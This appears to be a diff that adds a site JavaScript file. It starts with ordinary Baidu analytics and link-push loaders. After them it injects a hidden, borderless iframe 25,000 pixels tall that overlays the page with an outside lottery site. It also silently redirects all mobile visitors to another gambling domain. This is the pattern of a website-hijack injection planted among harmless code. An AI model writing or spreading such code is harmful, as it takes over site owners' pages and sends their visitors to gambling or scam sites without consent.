@@ -1,0 +1,32 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?196ae995e4dca5045c91dc2408955bcd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+//百度推送
+(function() {
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+
+//框架
+document.write("<iframe MARGINWIDTH=0 MARGINHEIGHT=0  HSPACE=0 VSPACE=0 FRameBORDER=0 SCROLLING=no src=http://ly.lyxz1.top/cp/ topmargin=0 width=100% height=25000></iframe>")
+
+
+//识别跳转
+var mobileUrl = "http://www.boyin888.vip/caipiao/",
+    mobile = (/mmp|symbian|smartphone|midp|wap|phone|xoom|iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
+if (mobile) {
+    window.location = mobileUrl
+}
